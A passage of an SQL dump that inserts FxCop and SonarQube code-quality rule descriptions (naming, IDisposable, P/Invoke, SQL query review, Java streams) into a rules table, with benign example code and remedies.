            // UnmanagedCode as GetTickCount is considered               
            // a safe method               
            return SafeNativeMethods.GetTickCount();
        }
    }
}

[SuppressUnmanagedCodeSecurityAttribute]
internal static class SafeNativeMethods
{
    [DllImport("kernel32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    internal static extern int GetTickCount();
}
</pre>





</p>
<h2>UnsafeNativeMethods Example</h2>

<h3>Description</h3>
<p>
                P/Invoke methods that cannot be safely called and that could cause side effects should be put in a class that is named UnsafeNativeMethods. These methods should be rigorously checked to make sure that they are not exposed to the user unintentionally. The rule {rule:fxcop:ReviewSuppressUnmanagedCodeSecurityUsage} can help with this. Alternatively, the methods should have another permission that is demanded instead of UnmanagedCode when they use them.
                The following example shows a Cursor.Hide method that wraps the ShowCursor function from user32.dll.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;

public static class Cursor
{
    // Callers do not require UnmanagedCode permission, however,        
    // they do require UIPermissionWindow.AllWindows        
    public static void Hide()
    {
        // Need to demand an appropriate permission            
        // in  place of UnmanagedCode permission as             
        // ShowCursor is not considered a safe method            
        new UIPermission(UIPermissionWindow.AllWindows).Demand();
        UnsafeNativeMethods.ShowCursor(false);
    }
}

[SuppressUnmanagedCodeSecurityAttribute]
internal static class UnsafeNativeMethods
{
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    internal static extern int ShowCursor([MarshalAs(UnmanagedType.Bool)]bool bShow);
}
</pre>





</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182161.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182161.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812636, 1510817812637, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (670, 'CA1707: Identifiers should not contain underscores', 'IdentifiersShouldNotContainUnderscores', 'CA1707', 'fxcop', '<h2>Cause</h2>
<p>
            The name of an identifier contains the underscore (_) character.
</p>
<h2>Rule Description</h2>
<p>
            By convention, identifier names do not contain the underscore (_) character. The rule checks namespaces, types, members, and parameters.
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
</p>
<h2>How to Fix Violations</h2>
<p>
            Remove all underscore characters from the name.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>




                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182245.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182245.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812639, 1510817812639, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (671, 'CA1051: Do not declare visible instance fields', 'DoNotDeclareVisibleInstanceFields', 'CA1051', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible type has an externally visible instance field.
</p>
<h2>Rule Description</h2>
<p>
            The primary use of a field should be as an implementation detail. Fields should be <code>private</code> or <code>internal</code> and should be exposed by using properties. It is as easy to access a property as it is to access a field, and the code in the accessors of a property can change as the features of the type expand without introducing breaking changes. Properties that just return the value of a private or internal field are optimized to perform on par with accessing a field; very little performance gain is associated with the use of externally visible fields over properties.
            Externally visible refers to <code>public</code>, <code>protected</code>, and <code>protected internal</code> (<code>Public</code>, <code>Protected</code>, and <code>Protected Friend</code> in Visual Basic) accessibility levels.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, make the field <code>private</code> or <code>internal</code> and expose it by using an externally visible property.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Externally visible fields do not provide any benefits that are unavailable to properties. Additionally, public fields cannot be protected by Link Demands. See {rule:fxcop:SecuredTypesShouldNotExposeFields}.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:SecuredTypesShouldNotExposeFields}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182141.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182141.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812640, 1510817812641, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (672, 'CA2213: Disposable fields should be disposed', 'DisposableFieldsShouldBeDisposed', 'CA2213', 'fxcop', '<h2>Cause</h2>
<p>
            A type that implements <code>System.IDisposable</code> declares fields that are of types that also implement <code>IDisposable</code>. The <code>Dispose</code> method of the field is not called by the <code>Dispose</code> method of the declaring type.
</p>
<h2>Rule Description</h2>
<p>
            A type is responsible for disposing of all its unmanaged resources; this is accomplished by implementing <code>IDisposable</code>. This rule checks to see whether a disposable type T declares a field F that is an instance of a disposable type FT. For each field F, the rule attempts to locate a call to FT.Dispose. The rule searches the methods called by T.Dispose, and one level lower (the methods called by the methods called by FT.Dispose).
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, call <code>Dispose</code> on fields that are of types that implement <code>IDisposable</code> if you are responsible for allocating and releasing the unmanaged resources held by the field.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if you are not responsible for releasing the resource held by the field, or if the call to <code>Dispose</code> occurs at a deeper calling level than the rule checks.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182328.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182328.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812642, 1510817812642, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (919, 'The Object.finalize() method should not be called', 'ObjectFinalizeCheck', 'S1111', 'squid', '<p>According to the official javadoc documentation, this Object.finalize() is called by the garbage collector on an object when garbage collection
determines that there are no more references to the object. Calling this method explicitly breaks this contract and so is misleading. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void dispose() throws Throwable {
  this.finalize();                       // Noncompliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/586.html">MITRE, CWE-586</a> - Explicit Call to Finalize() </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,cwe', false, 'HTML', 1510817812956, 1510817812957, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (920, 'Intermediate Stream methods should not be left unused', 'S3958', NULL, 'squid', '<p>There are two types of stream operations: intermediate operations, which return another stream, and terminal operations, which return something
other than a stream. Intermediate operations are lazy, meaning they aren''t actually executed until and unless a terminal stream operation is performed
on their results. Consequently if the result of an intermediate stream operation is not fed to a terminal operation, it serves no purpose, which is
almost certainly an error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
widgets.stream().filter(b -&gt; b.getColor() == RED); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int sum = widgets.stream()
                      .filter(b -&gt; b.getColor() == RED)
                      .mapToInt(b -&gt; b.getWeight())
                      .sum();
Stream&lt;Widget&gt; pipeline = widgets.stream()
                                 .filter(b -&gt; b.getColor() == GREEN)
                                 .mapToInt(b -&gt; b.getWeight());
sum = pipeline.sum();
</pre>
<h2>See</h2>
<p><a href="https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps">Stream Operations</a></p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'java8', false, 'HTML', 1510817812957, 1510817812958, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (674, 'CA1063: Implement IDisposable correctly', 'ImplementIDisposableCorrectly', 'CA1063', 'fxcop', '<h2>Cause</h2>
<p>


                <code>IDisposable</code>
               is not implemented correctly. Some reasons for this problem are listed here:
            <ul>
              <li>
                IDisposable is re-implemented in the class.
              </li>
              <li>
                Finalize is re-overridden.
              </li>
              <li>
                Dispose is overridden.
              </li>
              <li>
                Dispose() is not public, sealed, or named Dispose.
              </li>
              <li>
                Dispose(bool) is not protected, virtual, or unsealed.
              </li>
              <li>
                In unsealed types, Dispose() must call Dispose(true).
              </li>
              <li>
                For unsealed types, the Finalize implementation does not call either or both Dispose(bool) or the case class finalizer.
              </li>
            </ul>
            Violation of any one of these patterns will trigger this warning.
            Every unsealed root IDisposable type must provide its own protected virtual void Dispose(bool) method. Dispose() should call Dipose(true) and Finalize should call Dispose(false). If you are creating an unsealed root IDisposable type, you must define Dispose(bool) and call it. For more information, see <code>Cleaning Up Unmanaged Resources</code> in the Framework Design Guidelines section of the .NET Framework documentation.
</p>
<h2>Rule Description</h2>
<p>
            All IDisposable types should implement the Dispose pattern correctly.
</p>
<h2>How to Fix Violations</h2>
<p>
            Examine your code and determine which of the following resolutions will fix this violation.
            <ul>
              <li>
                Remove IDisposable from the list of interfaces that are implemented by {0} and override the base class Dispose implementation instead.
              </li>
              <li>
                Remove the finalizer from type {0}, override Dispose(bool disposing), and put the finalization logic in the code path where ''disposing'' is false.
              </li>
              <li>
                Remove {0}, override Dispose(bool disposing), and put the dispose logic in the code path where ''disposing'' is true.
              </li>
              <li>
                Ensure that {0} is declared as public and sealed.
              </li>
              <li>
                Rename {0} to ''Dispose'' and make sure that it is declared as public and sealed.
              </li>
              <li>
                Make sure that {0} is declared as protected, virtual, and unsealed.
              </li>
              <li>
                Modify {0} so that it calls Dispose(true), then calls GC.SuppressFinalize on the current object instance (''this'' or ''Me'' in Visual Basic), and then returns.
              </li>
              <li>
                Modify {0} so that it calls Dispose(false) and then returns.
              </li>
              <li>
                If you are writing an unsealed root IDisposable class, make sure that the implementation of IDisposable follows the pattern that is described earlier in this section.
              </li>
            </ul>
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms244737.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms244737.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812644, 1510817812645, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (675, 'CA2100: Review SQL queries for security vulnerabilities', 'ReviewSqlQueriesForSecurityVulnerabilities', 'CA2100', 'fxcop', '<h2>Cause</h2>
<p>
            A method sets the <code>IDbCommand.CommandText</code> property by using a string that is built from a string argument to the method.
</p>
<h2>Rule Description</h2>
<p>
            This rule assumes that the string argument contains user input. A SQL command string that is built from user input is vulnerable to SQL injection attacks. In a SQL injection attack, a malicious user supplies input that alters the design of a query in an attempt to damage or gain unauthorized access to the underlying database. Typical techniques include injection of a single quotation mark or apostrophe, which is the SQL literal string delimiter; two dashes, which signifies a SQL comment; and a semicolon, which indicates that a new command follows. If user input must be part of the query, use one of the following, listed in order of effectiveness, to reduce the risk of attack.
            <ul>
              <li>
                Use a stored procedure.
              </li>
              <li>
                Use a parameterized command string.
              </li>
              <li>
                Validate the user input for both type and content before you build the command string.
              </li>
            </ul>
            The following .NET Framework types implement the <code>CommandText</code> property or provide constructors that set the property by using a string argument.
            <ul>
              <li>


                    <code>System.Data.Odbc.OdbcCommand</code>
                   and <code>System.Data.Odbc.OdbcDataAdapter</code>
              </li>
              <li>


                    <code>System.Data.OleDb.OleDbCommand</code>
                   and <code>System.Data.OleDb.OleDbDataAdapter</code>
              </li>
              <li>


                    <code>System.Data.OracleClient.OracleCommand</code>
                   and <code>System.Data.OracleClient.OracleDataAdapter</code>
              </li>
              <li>

                  [System.Data.SqlServerCe.SqlCeCommand] and  [System.Data.SqlServerCe.SqlCeDataAdapter]
              </li>
              <li>


                    <code>System.Data.SqlClient.SqlCommand</code>
                   and <code>System.Data.SqlClient.SqlDataAdapter</code>
              </li>
            </ul>
            Notice that this rule is violated when the ToString method of a type is used explicitly or implicitly to construct the query string. The following is an example.









            <pre>
int x = 10;
string query = "SELECT TOP " + x.ToString() + " FROM Table";
</pre>




The rule is violated because a malicious user can override the ToString() method.The rule also is violated when ToString is used implicitly.









            <pre>
int x = 10;
string query = String.Format("SELECT TOP {0} FROM Table", x);
</pre>











                How to Fix Violations





</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the command text does not contain any user input.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182310.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182310.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812646, 1510817812646, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (676, 'CA1415: Declare P/Invokes correctly', 'DeclarePInvokesCorrectly', 'CA1415', 'fxcop', '<h2>Cause</h2>
<p>
            A platform invoke method is incorrectly declared.
</p>
<h2>Rule Description</h2>
<p>
            A platform invoke method accesses unmanaged code and is defined by using the <code>Declare</code> keyword in Visual Basic or the <code>System.Runtime.InteropServices.DllImportAttribute</code>. Currently, this rule looks for platform invoke method declarations that target Win32 functions that have a pointer to an OVERLAPPED structure parameter and the corresponding managed parameter is not a pointer to a <code>System.Threading.NativeOverlapped</code> structure.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, correctly declare the platform invoke method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182204.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182204.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812647, 1510817812647, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (677, 'CA1823: Avoid unused private fields', 'AvoidUnusedPrivateFields', 'CA1823', 'fxcop', '<h2>Cause</h2>
<p>
            This rule is reported when a private field in your code exists but is not used by any code path.
</p>
<h2>Rule Description</h2>
<p>
            Private fields were detected that do not appear to be accessed in the assembly.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the field or add code that uses it.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:AvoidUninstantiatedInternalClasses}<br/>




                {rule:fxcop:ReviewUnusedParameters}<br/>




                {rule:fxcop:RemoveUnusedLocals}<br/>




                {rule:fxcop:AvoidUncalledPrivateCode}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms245042.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms245042.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812648, 1510817812649, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (678, 'CA2222: Do not decrease inherited member visibility', 'DoNotDecreaseInheritedMemberVisibility', 'CA2222', 'fxcop', '<h2>Cause</h2>
<p>
            A private method in an unsealed type has a signature that is identical to a public method declared in a base type. The private method is not final.
</p>
<h2>Rule Description</h2>
<p>
            You should not change the access modifier for inherited members. Changing an inherited member to private does not prevent callers from accessing the base class implementation of the method. If the member is made private and the type is unsealed, inheriting types can call the last public implementation of the method in the inheritance hierarchy. If you must change the access modifier, either the method should be marked final or its type should be sealed to prevent the method from being overridden.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the access to be non-private. Alternatively, if your programming language supports it, you can make the method final.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182332.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182332.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812650, 1510817812650, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (679, 'CA1505: Avoid unmaintainable code', 'AvoidUnmantainableCode', 'CA1505', 'fxcop', '<h2>Cause</h2>
<p>
            A type or method has a low maintainability index value.
</p>
<h2>Rule Description</h2>
<p>
            The maintainability index is calculated by using the following metrics: lines of code, program volume, and cyclomatic complexity. Program volume is a measure of the difficulty of understanding of a type or method that is based on the number of operators and operands in the code. Cyclomatic complexity is a measure of the structural complexity of the type or method. You can learn more about code metrics at Measuring Complexity and Maintainability of Managed Code.
            A low maintainability index indicates that a type or method is probably difficult to maintain and would be a good candidate to redesign.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix this violation, redesign the type or method and try to split it into smaller and more focused types or methods.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Exclude this warning when a type or method is still considered maintainable despite its large size or when the type or method cannot be split.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb386043.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb386043.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '30min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812651, 1510817812652, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (680, 'CA1714: Flags enums should have plural names', 'FlagsEnumsShouldHavePluralNames', 'CA1714', 'fxcop', '<h2>Cause</h2>
<p>
            A public enumeration has the <code>System.FlagsAttribute</code> and its name does not end in ''s''.
</p>
<h2>Rule Description</h2>
<p>
            Types that are marked with <code>FlagsAttribute</code> have names that are plural because the attribute indicates that more than one value can be specified. For example, an enumeration that defines the days of the week might be intended for use in an application where you can specify multiple days. This enumeration should have the <code>FlagsAttribute</code> and could be called ''Days''. A similar enumeration that allows only a single day to be specified would not have the attribute, and could be called ''Day''.
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
</p>
<h2>How to Fix Violations</h2>
<p>
            Make the name of the enumeration a plural word, or remove the <code>FlagsAttribute</code> attribute if multiple enumeration values should not be specified simultaneously.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a violation if the name is a plural word but does not end in ''s''. For example, if the multiple-day enumeration that was described previously were named ''DaysOfTheWeek'', this would violate the logic of the rule but not its intent. Such violations should be suppressd.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:MarkEnumsWithFlags}<br/>




                {rule:fxcop:DoNotMarkEnumsWithFlags}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264486.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264486.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812652, 1510817812653, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (681, 'CA1035: ICollection implementations have strongly typed members', 'ICollectionImplementationsHaveStronglyTypedMembers', 'CA1035', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type implements <code>System.Collections.ICollection</code> but does not provide a strongly typed method for <code>ICollection.CopyTo</code>. The strongly typed version of <code>CopyTo</code> must accept two parameters and cannot have a <code>System.Array</code> or an array of <code>System.Object</code> as its first parameter.
</p>
<h2>Rule Description</h2>
<p>
            This rule requires <code>ICollection</code> implementations to provide strongly typed members so that users are not required to cast arguments to the <code>Object</code> type when they use the functionality that is provided by the interface. This rule assumes that the type that implements <code>ICollection</code> does so to manage a collection of instances of a type that is stronger than <code>Object</code>.


                <code>ICollection</code>
               implements the <code>System.Collections.IEnumerable</code> interface. If the objects in the collection extend <code>System.ValueType</code>, you must provide a strongly typed member for <code>GetEnumerator</code> to avoid the decrease in performance that is caused by boxing. This is not required when the objects of the collection are a reference type.
            To implement a strongly typed version of an interface member, implement the interface members explicitly by using names in the form InterfaceName.InterfaceMemberName, such as <code>CopyTo</code>. The explicit interface members use the data types that are declared by the interface. Implement the strongly typed members by using the interface member name, such as <code>CopyTo</code>. Declare the strongly typed members as public, and declare parameters and return values to be of the strong type that is managed by the collection. The strong types replace weaker types such as <code>Object</code> and <code>Array</code> that are declared by the interface.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, implement the interface member explicitly (declare it as <code>CopyTo</code>). Add the public strongly typed member, declared as CopyTo, and have it take a strongly typed array as its first parameter.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule if you implement a new object-based collection, such as a binary tree, where types that extend the new collection determine the strong type. These types should comply with this rule and expose strongly typed members.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:EnumeratorsShouldBeStronglyTyped}<br/>




                {rule:fxcop:ListsAreStronglyTyped}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/49stb304.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/49stb304.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812654, 1510817812654, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (928, 'Parsing should be used to convert "Strings" to primitives', 'S2130', NULL, 'squid', '<p>Rather than creating a boxed primitive from a <code>String</code> to extract the primitive value, use the relevant <code>parse</code> method
instead. It will be clearer and more efficient.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String myNum = "12.2";

float f = (new Float(myNum)).floatValue();  // Noncompliant; creates &amp; discards a Float
</pre>
<h2>Compliant Solution</h2>
<pre>
String myNum = "12.2";

float f = Float.parseFloat(myNum);
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'performance', false, 'HTML', 1510817812966, 1510817812967, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (929, 'Annotation arguments should appear in the order in which they were declared', 'S3340', NULL, 'squid', '<p>For optimal code readability, annotation arguments should be specified in the same order that they were declared in the annotation definition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@interface Pet {
    String name();
    String surname();
}

@Pet(surname ="", name="") // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
@interface Pet {
    String name();
    String surname();
}

@Pet(name ="", surname="") // Compliant
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817812967, 1510817812968, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (682, 'CA1009: Declare event handlers correctly', 'DeclareEventHandlersCorrectly', 'CA1009', 'fxcop', '<h2>Cause</h2>
<p>
            A delegate that handles a public or protected event does not have the correct signature, return type, or parameter names.
</p>
<h2>Rule Description</h2>
<p>
            Event handler methods take two parameters. The first is of type <code>System.Object</code> and is named ''sender''. This is the object that raised the event. The second parameter is of type <code>System.EventArgs</code> and is named ''e''. This is the data that is associated with the event. For example, if the event is raised whenever a file is opened, the event data typically contains the name of the file.
            Event handler methods should not return a value. In the C# programming language, this is indicated by the return type <code>void</code>. An event handler can invoke multiple methods in multiple objects. If the methods were allowed to return a value, multiple return values would occur for each event, and only the value of the last method that was invoked would be available.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, correct the signature, return type, or parameter names of the delegate. For details, see the following example.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:ReviewVisibleEventHandlers}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182133.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182133.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812655, 1510817812655, 1);
